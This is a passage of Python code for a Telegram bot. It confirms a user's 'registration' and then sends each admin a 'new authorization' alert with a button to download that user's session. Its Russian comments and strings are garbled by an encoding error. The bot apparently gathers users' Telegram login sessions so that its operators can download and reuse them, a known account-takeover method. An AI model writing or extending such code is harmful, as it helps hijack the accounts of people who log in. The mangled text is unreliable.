    # –°–æ–∑–¥–∞–µ–º –æ–±—ã—á–Ω—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    keyboard = types.ReplyKeyboardRemove()
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—à–Ω–æ–π —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
    await message.answer(
        "*‚úÖ –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!*\n\n"
        "*–û–∂–∏–¥–∞–π—Ç–µ –æ–¥–æ–±—Ä–µ–Ω–∏—è –ø—Ä–æ—Ñ–∏–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.*",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º, –µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–æ
    if admin_notifications:
        for admin_id in admin_ids:
            # –°–æ–∑–¥–∞–µ–º –∏–Ω–ª–∞–π–Ω –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –∞–¥–º–∏–Ω–∞
            kb = InlineKeyboardBuilder()
            kb.button(text="üì• –°–∫–∞—á–∞—Ç—å —Å–µ—Å—Å–∏—é", callback_data=f"download_session_{user_id}")
            
            # –§–æ—Ä–º–∏—Ä—É–µ–º –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ–º —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤
            user_name = message.from_user.full_name
            
            # –°–æ–∑–¥–∞–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ –ø—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Ñ–æ—Ä–º–∞—Ç–µ tg://user?id=123456
            user_link = f"[{user_name}](tg://user?id={user_id})"
            
            try:
                await bot.send_message(
                    admin_id,
                    f"*üîî –ù–æ–≤–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è!*\n\n"
                    f"*üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:* {user_link}\n"
                    f"*üÜî ID:* `{user_id}`",
                    reply_markup=kb.as_markup(),
                    parse_mode="Markdown"
                )
                logger.info(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É {admin_id} –æ –Ω–æ–≤–æ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏")
            except Exception as e:
                logger.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É {admin_id}: {str(e)}")

def register_auth_router(dp):
    """–†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç —Ä–æ—É—Ç–µ—Ä –≤ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–µ"""
    dp.include_router(router) 